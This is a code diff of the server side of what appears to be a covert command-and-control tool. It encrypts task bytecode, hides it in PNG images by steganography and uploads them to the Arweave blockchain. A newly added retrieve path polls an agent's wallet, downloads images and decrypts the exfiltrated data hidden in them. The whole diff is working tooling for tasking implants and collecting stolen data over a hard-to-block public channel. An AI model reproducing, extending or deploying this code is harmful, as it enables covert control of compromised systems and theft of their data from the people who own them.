@@ -73,84 +73,180 @@ def run_server(args):
 
     K_extract = server_derive_k_extract(K_root)
 
-    #Splits args.task into valid bytecode instructions
-    task_string = args.task
-    task_tokens = task_string.split()
+    if args.task is not None:
+        #Send path: compose, encrypt, embed, upload tasking
 
-    lines = []
-    current_instruction = []
-    for token in task_tokens:
+        #Guard: cover image required for embedding
+        if args.cover is None:
+            logger.info("Send path requires --cover")
+            return -1
 
-        if token in OPCODE_TABLE:
-            if current_instruction:
-                lines.append(" ".join(current_instruction))
-            current_instruction = [token]
-        else:
-            current_instruction.append(token)
+        #Splits args.task into valid bytecode instructions
+        task_string = args.task
+        task_tokens = task_string.split()
 
-    if current_instruction:
-        lines.append(" ".join(current_instruction))
+        lines = []
+        current_instruction = []
+        for token in task_tokens:
 
-    #Assembles the payload
-    logger.info("Step A, Payload assembly start")
-    bytecode = assemble_payload(lines)
-    bytecode_length = len(bytecode)
-    logger.info(f"Step A, bytecode length is {bytecode_length}")
+            if token in OPCODE_TABLE:
+                if current_instruction:
+                    lines.append(" ".join(current_instruction))
+                current_instruction = [token]
+            else:
+                current_instruction.append(token)
 
-    #Encrypts the task
-    payload, new_ratchet = encrypt_task(bytecode, K_ratchet)
-    payload_length = len(payload)
-    logger.info(f"Step A, Payload length is {payload_length}")
-    logger.info("Step A, Payload assembly finished")
+        if current_instruction:
+            lines.append(" ".join(current_instruction))
 
-    #Embeds the payload
-    logger.info("Step B, Payload embedding start")
-    stego_image = embed(args.cover, payload, K_extract)
+        #Assembles the payload
+        logger.info("Step A, Payload assembly start")
+        bytecode = assemble_payload(lines)
+        bytecode_length = len(bytecode)
+        logger.info(f"Step A, bytecode length is {bytecode_length}")
 
-    if stego_image is None:
-        logger.info("Step B, Payload embedding failed, payload exceeds cover capacity")
+        #Encrypts the task
+        payload, new_ratchet = encrypt_task(bytecode, K_ratchet)
+        payload_length = len(payload)
+        logger.info(f"Step A, Payload length is {payload_length}")
+        logger.info("Step A, Payload assembly finished")
+
+        #Embeds the payload
+        logger.info("Step B, Payload embedding start")
+        stego_image = embed(args.cover, payload, K_extract)
+
+        if stego_image is None:
+            logger.info("Step B, Payload embedding failed, payload exceeds cover capacity")
+            logger.info("Step B, Payload embedding finished")
+            return -1
+
+        stego_dir = "src/temp"
+        os.makedirs(stego_dir, exist_ok=True)
+        stego_path = os.path.join(stego_dir, "stego.png")
+        stego_image.save(stego_path)
+
+        logger.info(f"Step B, Embedded image saved to {stego_path}")
         logger.info("Step B, Payload embedding finished")
-        return -1
 
-    stego_dir = "src/temp"
-    os.makedirs(stego_dir, exist_ok=True)
-    stego_path = os.path.join(stego_dir, "stego.png")
-    stego_image.save(stego_path)
+        #Uploads the stego image
+        logger.info("Step C, Image upload start")
+        if args.mock:
+            mock = MockArweave()
+            shared_state["mock"] = mock
+            txid = mock.upload_image("server_wallet", stego_path)
+            logger.info(f"Step C, Image uploaded in transaction_id {txid}")
+            logger.info("Step C, Image upload finished")
+        else:
+            server_wallet = load_wallet(args.wallet)
+            txid = upload_image(server_wallet, stego_path)
+            logger.info(f"Step C, Image uploaded in transaction_id {txid}")
+            logger.info("Step C, Image upload finished")
 
-    logger.info(f"Step B, Embedded image saved to {stego_path}")
-    logger.info("Step B, Payload embedding finished")
+        #Stores shared state for the agent
+        shared_state["txid"] = txid
+        shared_state["new_ratchet"] = new_ratchet
+        shared_state["K_extract"] = K_extract
+        shared_state["K_ratchet"] = K_ratchet
 
-    #Uploads the stego image
-    logger.info("Step C, Image upload start")
-    if args.mock:
-        mock = MockArweave()
-        shared_state["mock"] = mock
-        txid = mock.upload_image("server_wallet", stego_path)
-        logger.info(f"Step C, Image uploaded in transaction_id {txid}")
-        logger.info("Step C, Image upload finished")
+        #Persists the server keys
+        server_save_server_keys(
+            args.keyfile,
+            K_root,
+            new_ratchet,
+            K_exfil_ratchet,
+            agent_wallet,
+            last_seen_txid,
+        )
+
+        return 1
+
     else:
-        server_wallet = load_wallet(args.wallet)
-        txid = upload_image(server_wallet, stego_path)
-        logger.info(f"Step C, Image uploaded in transaction_id {txid}")
-        logger.info("Step C, Image upload finished")
+        #Retrieve path: poll agent wallet, download, extract, decrypt exfil
 
-    #Stores shared state for the agent
-    shared_state["txid"] = txid
-    shared_state["new_ratchet"] = new_ratchet
-    shared_state["K_extract"] = K_extract
-    shared_state["K_ratchet"] = K_ratchet
+        #Guard: agent wallet must be configured
+        if not agent_wallet:
+            logger.info("Retrieve path requires agent_wallet in keyfile")
+            return -1
 
-    #Persists the server keys
-    server_save_server_keys(
-        args.keyfile,
-        K_root,
-        new_ratchet,
-        K_exfil_ratchet,
-        agent_wallet,
-        last_seen_txid,
-    )
+        #Poll agent wallet tx history
+        logger.info("Step A, Agent wallet poll start")
 
-    return 1
+        if args.mock:
+            mock = shared_state.get("mock")
+            if mock is None:
+                logger.info("Step A, Mock instance not available, no exfil")
+                return 0
+            txids = mock.get_wallet_transactions(agent_wallet)
+        else:
+            txids = get_wallet_transactions(agent_wallet)
+
+        #Filter out txids up to and including last_seen_txid
+        if last_seen_txid and last_seen_txid in txids:
+            idx = txids.index(last_seen_txid)
+            new_txids = txids[idx + 1:]
+        else:
+            new_txids = txids
+
+        if not new_txids:
+            logger.info("Step A, No new exfil found")
+            return 0
+
+        #Process oldest new exfil in chronological order (single-shot)
+        exfil_txid = new_txids[0]
+        logger.info(f"Step A, Found exfil txid {exfil_txid}")
+
+        if args.mock:
+            image_bytes = shared_state["mock"].download_image(exfil_txid)
+        else:
+            image_bytes = download_image(exfil_txid)
+
+        last_seen_txid = exfil_txid
+        logger.info("Step A, Exfil image download finished")
+
+        #Save downloaded bytes to a temp file
+        logger.info("Step B, Exfil image stego extraction start")
+
+        stego_stream = BytesIO(image_bytes)
+        stego_image = Image.open(stego_stream)
+
+        stego_dir = "src/temp"
+        os.makedirs(stego_dir, exist_ok=True)
+        stego_path = os.path.join(stego_dir, "exfil_stego.png")
+        stego_image.save(stego_path)
+
+        logger.info(f"Step B, Exfil image saved to {stego_path}")
+
+        #Extract the payload
+        payload = extract(stego_path, K_extract)
+        logger.info(f"Step B, Exfil payload length {len(payload)}")
+        logger.info("Step B, Exfil image stego extraction finished")
+
+        #Decrypt the exfil payload
+        logger.info("Step C, Exfil payload decryption start")
+        payload_result = decrypt_task(payload, K_exfil_ratchet)
+
+        if payload_result is None:
+            logger.info("Step C, Exfil payload decryption failed")
+            logger.info("Step C, Exfil payload decryption finished")
+            return -1
+
+        exfil_data, new_exfil_ratchet = payload_result
+        logger.info(f"Step C, Exfil data decrypted, {len(exfil_data)} bytes")
+        logger.info("Step C, Exfil payload decryption finished")
+
+        #Persist the server keys (K_exfil_ratchet advanced, K_ratchet unchanged)
+        logger.info("Step D, Advance and persist exfil ratchet start")
+        server_save_server_keys(
+            args.keyfile,
+            K_root,
+            K_ratchet,
+            new_exfil_ratchet,
+            agent_wallet,
+            last_seen_txid,
+        )
+        logger.info("Step D, Advance and persist exfil ratchet finished")
+
+        return 1
 
 def run_agent(args):
     #Load agent keys from keyfile
